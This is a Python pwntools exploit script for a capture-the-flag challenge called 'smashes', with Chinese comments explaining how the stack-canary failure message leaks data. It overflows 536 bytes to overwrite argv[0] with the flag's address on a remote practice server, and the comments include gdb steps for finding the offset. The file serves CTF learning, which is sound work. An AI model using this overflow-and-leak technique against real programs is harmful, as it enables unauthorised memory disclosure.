import sys
sys.path.append("/home/pwnuser/Desktop/pwn")
from tool import *
from pwn import *

def clean(name):
	print("%s : %s" % (name , p.recv()))
#  64 dyna
#  stack canary | nx | fortify
#  考点:stack canary 检测失败时 会输出 程序 argv[0]地址上的值
#  目标:覆盖argv[0] , 直接输出目标地址的值(flag) 

fpath  = "./smashes"
offset = 536      
# 博客中测试方式 
# 	find /home/pwnuser/Desktop/pwn/smashes/smashes 
# 	find (第一次find语句结果中[stack]的第一条结果的地址) 
# 	distance $rsp (第二次find语句结果,[stack] 对应的地址addr1([stack]  addr1 --> addr2 ("/home/pwnuser/Desktop/pwn/smashes/smashes")))
# 	 	=> 得到offset     From 0x7fffffffe320 to 0x7fffffffe538: 536 (offset)bytes, 134 dwords   
debug = 0
if debug:
	p = process(fpath)	
else:
	p = remote("pwn.jarvisoj.com" , 9877)

p.recv()
flag_addr =0x400d20 # 因为逻辑中输入会overwrite 会覆盖 0x600D21 处的flag 所以gdb | find PCTF 找到了 另一个有flag的地址

p.sendline(fill(offset) +p64(flag_addr)) # 覆盖 argv[0]
p.recv()
p.sendline("test") # 随意
clean("result")

